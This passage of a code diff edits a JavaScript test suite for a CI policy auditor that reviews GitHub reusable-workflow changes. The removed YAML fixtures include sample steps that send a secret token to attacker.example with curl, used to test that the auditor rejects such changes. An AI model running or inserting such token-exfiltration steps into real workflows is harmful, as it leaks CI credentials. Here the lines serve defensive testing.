@@ -16,59 +16,15 @@ import {
 
 const SHA = "0123456789abcdef0123456789abcdef01234567";
 const PRODUCTION_SHA = "99ac2f8c5b09dbb785d4eaf18465cbd96c30290c";
-const LOCAL_SELECTOR_SHA = "de50a08b6093d231519ee7a4c9371db76c0a7e1e";
-const SECURITY_HARDENING_SHA = "f2d5e06757201f2fce187096a2c6fa805836c3d2";
 const FLEET_CLAUDE_REVIEW_SHA = "4dbb0dfcc1fcbaf30e1a5573bf776af54e4e7e1a";
-const GH_FREE_GATE_SHA = "90f1c54935203fa31b5b3d1f41531228be2c2b7f";
-const REPINE_LANE_SHA_V0_14_2 = "7107b34832a7b6db5d08d3b132621c599fbe5e50";
-const REPINE_LANE_SHA_V0_17_0 = "d26c750691b5498fab529d115b63f84aa7aecebe";
-const REPINE_LANE_SHA_V0_17_2 = "0f8176e87e0be518f382664779655011bf95784a";
 const REPINE_LANE_SHA_V0_22_0 = "906ae7ef379ea4d2b8497f64475dce1d3d8715c4";
 const REPINE_LANE_SHA_V0_22_1 = "cd2f4e6d500e7923c0db521b4d10034d36331ed3";
 const REPINE_LANE_SHA_V0_22_2 = "5776760254f8b63cba44e896f51604cb755350d9";
-const REPINE_LANE_SHA_V0_24_0 = "2c1de45aa0e1b1489afb8edfebc12cb3a4fa6ac3";
-const REPINE_LANE_SHA_V0_25_0 = "91d06c94d733e5daa507e0afaa06a140bb46d337";
-const REPINE_LANE_SHA_V0_26_0 = "de644a0a80d78096a9f6074710f913eed13c9a91";
-const REPINE_LANE_SHA_V0_27_0 = "ac062650c46005edb4787aff378347746bf63804";
-const REPINE_LANE_SHA_V0_27_1 = "4610c31e92eb1c4b24981e2f200ac87bdb2a1753";
-const REPINE_LANE_SHA_V0_28_0 = "39390344a0fef0671d3e5a7546dd03af7a36b8f5";
-const REPINE_LANE_SHA_V0_28_1 = "cc0462990687534e9597de9e00ab89d3dcca61d2";
-const REPINE_LANE_SHA_V0_29_0 = "6567856ef6070a4a1c9c2691f610278a7f2de153";
-const REPINE_LANE_SHA_V0_29_1 = "0d3e6a6f3851cf678f82fa9a8a17f10faa909ac9";
-const REPINE_LANE_SHA_V0_30_1 = "35880dcbb2f174aac90159e276dc7eddf1bc20b9";
-const REPINE_LANE_SHA_V0_39_8 = "594987abe8657a40bccc13d301f1f0d5cccb5348";
-const REPINE_LANE_SHA_V0_40_0 = "a92020292976c2e9b50f7adc922693a45a6c1226";
-const REPINE_LANE_SHA_V0_41_0 = "a621ef8112677a519b662ec5d2547475c0101f7e";
-const REPINE_LANE_SHA_V0_42_0 = "182aca3ad32b79fd002def94e58eb498ac49e7af";
-const REPINE_LANE_SHA_V0_42_1 = "4cfd14e8b6f8b740f5f0af27f80139a0d40a596d";
-const REPINE_LANE_SHA_V0_42_2 = "a623e29085a3be885718cf9c0c0eca85bb53dd97";
-const REPINE_LANE_SHA_V0_44_0 = "58a60eac76cf36ed8ef4f59460acb4a8d34d3ff7";
-const REPINE_LANE_SHA_V0_44_1 = "bc02e0504d83df70a2c95fcf3651d0f1eac3e252";
-const REPINE_LANE_SHA_V0_45_0 = "3c8a4b2aeff5871cf72d35a686692bc6f0d44815";
-const REPINE_LANE_SHA_V0_48_0 = "96b50d451c4483c476f2f963674e0a3ba9d50fe3";
-const REPINE_LANE_SHA_V0_49_0 = "ff8cd36321423de961381e608e4a31563e74adb3";
-const REPINE_LANE_SHA_V0_51_0 = "f129f4c142d00ec3feacbf2b9102d327088504bf";
-const REPINE_LANE_SHA_V0_54_0 = "7b362428c76085a160e28656cd2c75c3147a69ff";
-const REPINE_LANE_SHA_V0_55_0 = "3a2c748fdef9cfb9ceec5a66289e21842189689f";
-const REPINE_LANE_SHA_V0_56_0 = "1bb8953644d16f21d10718962c6702f01ea3308a";
-const REPINE_LANE_SHA_V0_58_0 = "5e18f3d6cebd6fa5e66b0941ee0f7ed6ba288d6c";
-const REPINE_LANE_SHA_V0_59_0 = "4aff99320ef484a7beac35ee3a7b7b854ec1e33f";
-const REPINE_LANE_SHA_V0_59_1 = "8bd4d7f963a06627dd2d551ffcd8d9db5e6b881b";
-const REPINE_LANE_SHA_V0_60_0 = "82ca5ca9be6e18a1addb7986eae15689339aedbc";
-const REPINE_LANE_SHA_V0_61_0 = "164c2809f6150429b6f24d4a2777bb377af953d9";
-const REPINE_LANE_SHA_V0_62_0 = "2fe38c031867900824c164e33a140a335ed9ecf0";
-const REPINE_LANE_SHA_V0_65_14 = "3180217076b19bbdfccc43026c7f91c604da673d";
-const STANDARDS_SYNC_SHA = "35f2684ac953794b854bac1959df00e74eeca1d9";
 const REUSABLE_PATH = "melodic-software/ci-workflows/.github/workflows/osv-scanner.yml";
 const REUSABLE_REFERENCE = `${REUSABLE_PATH}@${SHA}`;
 const HOSTED_REUSABLE_REFERENCE = `melodic-software/ci-workflows/.github/workflows/osv-scanner.yml@${PRODUCTION_SHA}`;
 const SECRET_REUSABLE_REFERENCE = `melodic-software/ci-workflows/.github/workflows/claude-review.yml@${PRODUCTION_SHA}`;
 const FLEET_CLAUDE_REVIEW_REFERENCE = `melodic-software/ci-workflows/.github/workflows/claude-review.yml@${FLEET_CLAUDE_REVIEW_SHA}`;
-const DEPENDABOT_BUMP_SHA = "84b99cdba10bf8a7e10572f30200ac793bec3a30";
-const DEPENDABOT_BUMP_REFERENCE = `${REUSABLE_PATH}@${DEPENDABOT_BUMP_SHA}`;
-const ALTERNATE_REVIEWED_SHA = "1123456789abcdef0123456789abcdef01234567";
-const ALTERNATE_REUSABLE_REFERENCE = `${REUSABLE_PATH}@${ALTERNATE_REVIEWED_SHA}`;
-const STANDARDS_SYNC_REUSABLE_REFERENCE = `melodic-software/ci-workflows/.github/workflows/standards-sync.yml@${STANDARDS_SYNC_SHA}`;
 // A hypothetical runner-input revision of the standards-sync workflow: the
 // secret-capable contract shape a statically read-only caller uses to route
 // the sync lane to the managed fleet.
@@ -90,41 +46,22 @@ const FLEET_LABEL = "melodic-ubuntu-24.04-x64";
 const FLEET_REVIEW_LABEL = "melodic-review-ubuntu-24.04-x64";
 const CANONICAL_OBSERVER_SECRET_EXPRESSION = `\${{ secrets.CI_RUNNER_OBSERVER_PRIVATE_KEY }}`;
 const BASE_POLICY = JSON.parse(await readFile(new URL("./policy.json", import.meta.url), "utf8"));
-// Reviewed contracts at ci-workflows revisions no consumer pins any more. The
-// live policy admits only current pins; the tests that prove how each
-// contract was reviewed read them from here.
+// A policy contract key: the reusable workflow path without its @ref.
+const pathOf = (reference) => reference.slice(0, reference.lastIndexOf("@"));
+// Contract shapes reviewed for earlier ci-workflows files, keyed by the
+// reference each was reviewed at. Tests register a shape under its path.
 const HISTORICAL_CONTRACTS = JSON.parse(
   await readFile(new URL("./fixtures/historical-contracts.json", import.meta.url), "utf8"),
 ).approvedReusableWorkflowContracts;
-const HISTORICAL_POLICY = {
+const HOSTED_ONLY_POLICY = {
   ...BASE_POLICY,
-  approvedReusableWorkflowContracts: {
-    ...BASE_POLICY.approvedReusableWorkflowContracts,
-    ...HISTORICAL_CONTRACTS,
-  },
+  approvedReusableWorkflowContracts: Object.fromEntries(
+    [HOSTED_REUSABLE_REFERENCE, SECRET_REUSABLE_REFERENCE].map((reference) => [
+      pathOf(reference),
+      HISTORICAL_CONTRACTS[reference],
+    ]),
+  ),
 };
-// Each historical reusable's file name at the revision the live policy admits.
-const LIVE_CI_WORKFLOWS_SHA = "ab83b01273026ab5c23c6f3b40e946d97a863fa2";
-const LIVE_SUCCESSOR = {
-  checks: "pr-run-checks",
-  "claude-review": "pr-review",
-  "claude-security-review": "pr-review-security",
-  "issue-triage-label": "intake-label-needs-triage",
-  "osv-scanner": "pr-scan-dependencies",
-  "standards-sync": "maintenance-sync-standards",
-  zizmor: "pr-audit-workflows",
-};
-
-function assertLiveSuccessors(reusables) {
-  for (const reusable of reusables) {
-    const key = `melodic-software/ci-workflows/.github/workflows/${LIVE_SUCCESSOR[reusable]}.yml@${LIVE_CI_WORKFLOWS_SHA}`;
-    assert.equal(
-      BASE_POLICY.approvedReusableWorkflowContracts[key]?.routing,
-      "runner-input",
-      `the live policy must admit ${reusable}'s successor ${key}`,
-    );
-  }
-}
 const temporaryRoots = [];
 
 test("duplicate JSON object members fail closed with their policy or schema path", () => {
@@ -182,7 +119,7 @@ async function repository({
       {
         ...BASE_POLICY,
         approvedReusableWorkflowContracts: {
-          [REUSABLE_REFERENCE]: {
+          [pathOf(REUSABLE_REFERENCE)]: {
             routing: "runner-input",
             runnerInput: "runner",
             allowedInputs: ["runner"],
@@ -201,906 +138,12 @@ async function repository({
   return root;
 }
 
-// Every test in this suite audits a repository against reusable-workflow
-// references that may share a workflow path with an already-approved
-// contract, which makes them auto-approval *candidates*. Without a hermetic
-// default, `auditRepository`'s default `fetchImpl` (the real `fetch`) would
-// reach out to raw.githubusercontent.com during otherwise-offline tests.
-// This stub keeps the whole suite network-free by declining every candidate
-// (as today's fail-closed behavior does); tests that exercise auto-approval
-// itself pass their own `fetchImpl` via `options`.
-const HERMETIC_FETCH_STUB = async () => ({ ok: false, status: 404, statusText: "Not Found" });
-
 function audit(root, options = {}) {
   return auditRepository({
     root,
     policyPath: path.join(root, "runner-policy-policy.json"),
-    fetchImpl: HERMETIC_FETCH_STUB,
     ...options,
   });
-}
-
-// Serves the tag refs and release-by-tag reads of the release check: each
-// `tags` entry is [tag name, ref object], and every tag's release has the
-// GitHub release fields in `release` (immutable and published by default).
-// Annotated tag objects resolve through `tagObjects` (tag object SHA -> object).
-function releaseFetchImpl(inner, tags, { release = {}, tagObjects = {} } = {}) {
-  return async (url, init) => {
-    if (url.endsWith("/git/matching-refs/tags/")) {
-      return {
-        ok: true,
-        json: async () => tags.map(([name, object]) => ({ ref: `refs/tags/${name}`, object })),
-      };
-    }
-    const tagObject = /\/git\/tags\/([0-9a-f]{40})$/.exec(url);
-    if (tagObject && tagObjects[tagObject[1]]) {
-      return { ok: true, json: async () => ({ object: tagObjects[tagObject[1]] }) };
-    }
-    const releaseTag = /\/releases\/tags\/([^/]+)$/.exec(url);
-    if (releaseTag && release === null) {
-      return { ok: false, status: 404, statusText: "Not Found" };
-    }
-    if (releaseTag) {
-      return {
-        ok: true,
-        json: async () => ({
-          tag_name: releaseTag[1],
-          draft: false,
-          prerelease: false,
-          immutable: true,
-          ...release,
-        }),
-      };
-    }
-    return inner(url, init);
-  };
-}
-
-// Every SHA in `shas` is the commit of its own lightweight release tag.
-function releasedShas(inner, shas) {
-  return releaseFetchImpl(
-    inner,
-    shas.map((sha, index) => [`v0.0.${index}`, { type: "commit", sha }]),
-  );
-}
-
-function fetchImplFor(sourcesBySha) {
-  return releasedShas(async (url) => {
-    for (const [sha, body] of Object.entries(sourcesBySha)) {
-      if (url.includes(`/${sha}/`)) {
-        return { ok: true, text: async () => body };
-      }
-    }
-    return { ok: false, status: 404, statusText: "Not Found" };
-  }, Object.keys(sourcesBySha));
-}
-
-const REUSABLE_WORKFLOW_BASIS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_IDENTICAL_SURFACE_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    secrets:
-      token:
-        required: false
-    inputs:
-      runner:
-        required: true
-        type: string
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - run: echo "cosmetic step-body change, not security-relevant"
-`;
-
-const REUSABLE_WORKFLOW_CHANGED_PERMISSIONS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: write
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_CHANGED_INPUTS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-      extra:
-        required: false
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_CHANGED_JOB_PERMISSIONS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    permissions:
-      contents: write
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_CHANGED_RUNS_ON_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: self-hosted
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_ADDED_CREDENTIAL_ACTION_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - uses: actions/create-github-app-token@v2
-`;
-
-const REUSABLE_WORKFLOW_CREDENTIAL_REFERENCE_BASIS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - run: echo scan
-        env:
-          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
-`;
-
-const REUSABLE_WORKFLOW_CHANGED_CREDENTIAL_REFERENCE_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - run: echo scan
-        env:
-          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_B }}
-`;
-
-// SCAN_TOKEN's value is byte-identical in both sources below; only the
-// step's run: body differs. A candidate that keeps an already-reviewed
-// credential expression unchanged while rewriting what the step does with
-// that credential (here: a benign scan command vs. exfiltrating the token to
-// an external host) must not be auto-approved just because the compared
-// surface only ever recorded the fields that themselves contain a credential
-// expression.
-const REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_BASIS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - run: echo scan
-        env:
-          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
-`;
-
-const REUSABLE_WORKFLOW_CREDENTIAL_STEP_BODY_CHANGED_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - run: curl -X POST https://attacker.example -d "token=$SCAN_TOKEN"
-        env:
-          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
-`;
-
-// The credential-bearing gate must fire on every field family, not just
-// condition/env/with/credentialAction: this step's only credential
-// expression is inline in `run:`, with no env or with block at all. A gate
-// that omitted the remaining-step-body check would drop this step out of the
-// compared surface entirely, so a bump that swaps only the referenced secret
-// (A -> B) would leave every recorded surface field identical and be
-// auto-approved.
-const REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_BASIS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - run: deploy --token \${{ secrets.DEPLOY_TOKEN_A }}
-`;
-
-const REUSABLE_WORKFLOW_CREDENTIAL_RUN_BODY_ONLY_CHANGED_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - run: deploy --token \${{ secrets.DEPLOY_TOKEN_B }}
-`;
-
-// The reviewed basis already contains a localCredentialActions entry
-// (actions/create-github-app-token), pinned to one ref. The changed source
-// below pins the identical action to a different ref only -- the same
-// Dependabot-bump shape as any other credential-minting-action SHA/tag bump.
-const REUSABLE_WORKFLOW_CREDENTIAL_ACTION_REF_BASIS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - uses: actions/create-github-app-token@c1a285145b9d317df6ced56c09f525b5c2b6f49
-`;
-
-const REUSABLE_WORKFLOW_CREDENTIAL_ACTION_REF_CHANGED_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - uses: actions/create-github-app-token@df432f6cf7f0b4bd6dd8b7f9c0a4b1a0d33ba0d2
-`;
-
-// Workflow-scope env exposes a credential to every step in the job: each
-// step can read $SCAN_TOKEN from the runner process environment without
-// containing a credential expression of its own. The changed sources below
-// keep the credential entry byte-identical while (a) rewriting the step
-// body that consumes the inherited token and (b) changing only the sibling
-// UPLOAD_URL env value that decides where the token-bearing upload goes. A
-// surface that records only fields that themselves contain a credential
-// expression sees no change in either case.
-const REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-env:
-  SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
-  UPLOAD_URL: https://results.example
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - run: osv-scan --upload "$UPLOAD_URL"
-`;
-
-const REUSABLE_WORKFLOW_INHERITED_ENV_STEP_BODY_CHANGED_SOURCE =
-  REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE.replace(
-    'osv-scan --upload "$UPLOAD_URL"',
-    'curl -X POST "$UPLOAD_URL" -d "token=$SCAN_TOKEN"',
-  );
-
-const REUSABLE_WORKFLOW_INHERITED_ENV_SIBLING_VALUE_CHANGED_SOURCE =
-  REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE.replace(
-    "https://results.example",
-    "https://attacker.example",
-  );
-
-// The workflow-level `name:` stays outside the recorded surface even under
-// the inherited-credential gate's full recording, so this pair proves the
-// gate still auto-approves a genuinely unchanged surface rather than
-// declining every workflow that carries a workflow-scope credential env.
-const REUSABLE_WORKFLOW_INHERITED_ENV_COSMETIC_SOURCE =
-  REUSABLE_WORKFLOW_INHERITED_ENV_BASIS_SOURCE.replace(
-    "name: osv-scanner",
-    "name: osv-scanner-cosmetically-renamed",
-  );
-
-// Job-scope env is exported to that job's steps the same way workflow-scope
-// env is; the changed source rewrites a step body that consumes the
-// inherited token while the env entry itself stays byte-identical.
-const REUSABLE_WORKFLOW_JOB_ENV_BASIS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    env:
-      SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
-    steps:
-      - run: osv-scan --offline
-`;
-
-const REUSABLE_WORKFLOW_JOB_ENV_STEP_BODY_CHANGED_SOURCE =
-  REUSABLE_WORKFLOW_JOB_ENV_BASIS_SOURCE.replace(
-    "osv-scan --offline",
-    'curl -X POST https://attacker.example -d "token=$SCAN_TOKEN"',
-  );
-
-// Both `uses:` shapes below are commit-relative: GitHub resolves a leading
-// `./` from the same commit as the file that contains it, so a SHA bump
-// changes what the byte-identical reference resolves to (the nested
-// workflow's runners/secrets, the local action's executable content)
-// without moving any field the surface diff compares on the caller.
-const REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps: []
-  nested:
-    uses: ./.github/workflows/nested-scan.yml
-`;
-
-const REUSABLE_WORKFLOW_LOCAL_ACTION_STEP_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - uses: ./.github/actions/scan-setup
-`;
-
-// GitHub applies workflow- and job-level `defaults.run` (shell,
-// working-directory) to every `run:` step, so a bump that edits only
-// `defaults` makes byte-identical credential-bearing step bodies execute
-// under a different interpreter or working directory. Neither field holds a
-// credential expression or routes anything itself, so a surface recording
-// only credential-bearing values and routing fields never sees the change.
-const REUSABLE_WORKFLOW_WORKFLOW_DEFAULTS_BASIS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-defaults:
-  run:
-    shell: bash
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - run: echo scan
-        env:
-          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
-`;
-
-const REUSABLE_WORKFLOW_WORKFLOW_DEFAULTS_CHANGED_SOURCE =
-  REUSABLE_WORKFLOW_WORKFLOW_DEFAULTS_BASIS_SOURCE.replace(
-    "    shell: bash",
-    "    shell: bash\n    working-directory: untrusted",
-  );
-
-const REUSABLE_WORKFLOW_JOB_DEFAULTS_BASIS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    defaults:
-      run:
-        shell: bash
-    steps:
-      - run: echo scan
-        env:
-          SCAN_TOKEN: \${{ secrets.SCAN_TOKEN_A }}
-`;
-
-const REUSABLE_WORKFLOW_JOB_DEFAULTS_CHANGED_SOURCE =
-  REUSABLE_WORKFLOW_JOB_DEFAULTS_BASIS_SOURCE.replace(
-    "        shell: bash",
-    "        shell: bash\n        working-directory: untrusted",
-  );
-
-// Job-level defaults.run accepts expressions that can dereference `needs`,
-// so a byte-identical defaults declaration can resolve to a different
-// working directory when the producing job's output changes underneath it --
-// the same indirection the needs catch-all already declines for every other
-// routing-relevant field.
-const REUSABLE_WORKFLOW_DEFAULTS_NEEDS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  pick:
-    runs-on: ubuntu-24.04
-    outputs:
-      dir: \${{ steps.pick.outputs.dir }}
-    steps:
-      - id: pick
-        run: echo "dir=safe" >> "$GITHUB_OUTPUT"
-  scan:
-    needs: pick
-    runs-on: ubuntu-24.04
-    defaults:
-      run:
-        working-directory: \${{ needs.pick.outputs.dir }}
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_DEFAULTS_NEEDS_COSMETIC_SOURCE =
-  REUSABLE_WORKFLOW_DEFAULTS_NEEDS_SOURCE.replace(
-    "    steps: []",
-    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
-  );
-
-// The ci-workflows maintenance-sync-standards `sync` job shape: the matrix
-// comes from another job's output, but runs-on reads an input, so the matrix
-// only fans out steps and routes nothing.
-const REUSABLE_WORKFLOW_NEEDS_MATRIX_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  plan:
-    runs-on: ubuntu-24.04
-    outputs:
-      matrix: \${{ steps.plan.outputs.matrix }}
-    steps:
-      - id: plan
-        run: echo 'matrix={"include":[{"repo":"a"}]}' >> "$GITHUB_OUTPUT"
-  scan:
-    needs: plan
-    runs-on: \${{ inputs.runner }}
-    strategy:
-      fail-fast: false
-      matrix: \${{ fromJson(needs.plan.outputs.matrix) }}
-    steps:
-      - run: echo "\${{ matrix.repo }}"
-`;
-
-const withCosmeticStep = (source) =>
-  source.replace(
-    `      - run: echo "\${{ matrix.repo }}"`,
-    `      - run: echo "\${{ matrix.repo }}"\n      - run: echo "cosmetic step-body change, not security-relevant"`,
-  );
-
-const REUSABLE_WORKFLOW_EMPTY_PERMISSIONS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions: {}
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_OMITTED_PERMISSIONS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_EMPTY_JOB_PERMISSIONS_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    permissions: {}
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_REMOVED_WORKFLOW_CALL_SOURCE = `name: osv-scanner
-on: push
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_MALFORMED_WORKFLOW_CALL_SOURCE = `name: osv-scanner
-on:
-  workflow_call: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps: []
-`;
-
-// scan's runs-on stays a byte-identical expression across the two revisions
-// below; only pick's producing step differs (ubuntu-24.04 vs. self-hosted).
-// A surface diff that inspects only the literal runs-on declaration would
-// see no change and auto-approve a routing boundary that actually moved.
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  pick:
-    runs-on: ubuntu-24.04
-    outputs:
-      runner: \${{ steps.pick.outputs.runner }}
-    steps:
-      - id: pick
-        run: echo "runner=ubuntu-24.04" >> "$GITHUB_OUTPUT"
-  scan:
-    needs: pick
-    runs-on: \${{ needs.pick.outputs.runner }}
-    steps: []
-`;
-
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_COSMETIC_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
-    "    steps: []",
-    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
-  );
-
-// Same needs-output indirection as REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE,
-// but through GitHub's equivalent index syntax (`outputs['runner']`) instead
-// of property dereference (`outputs.runner`). Both spellings resolve the
-// same producing job's output value at evaluation time.
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_INDEX_SYNTAX_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
-    "needs.pick.outputs.runner",
-    "needs.pick.outputs['runner']",
-  );
-
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_INDEX_SYNTAX_COSMETIC_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_INDEX_SYNTAX_SOURCE.replace(
-    "    steps: []",
-    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
-  );
-
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_DOUBLE_QUOTE_INDEX_SYNTAX_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
-    "needs.pick.outputs.runner",
-    'needs.pick.outputs["runner"]',
-  );
-
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_DOUBLE_QUOTE_INDEX_SYNTAX_COSMETIC_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_DOUBLE_QUOTE_INDEX_SYNTAX_SOURCE.replace(
-    "    steps: []",
-    '    steps:\n      - run: echo "cosmetic step-body change, not security-relevant"',
-  );
-
-// Index syntax is a generic property accessor, not special-cased to the
-// final `<name>` segment: `needs['pick']` is as valid as `needs.pick`. This
-// fixture brackets every segment (`needs['pick']['outputs']['runner']`) to
-// prove the detector does not miss bracket indexing on the job-id or the
-// literal `outputs` segment, only on the output name.
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FULLY_BRACKETED_SOURCE =
-  REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE.replace(
-    "needs.pick.outputs.runner",
-    "needs['pick']['outputs']['runner']",
-  );
-
-const REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FULLY_BRACKETED_COSMETIC_SOURCE =
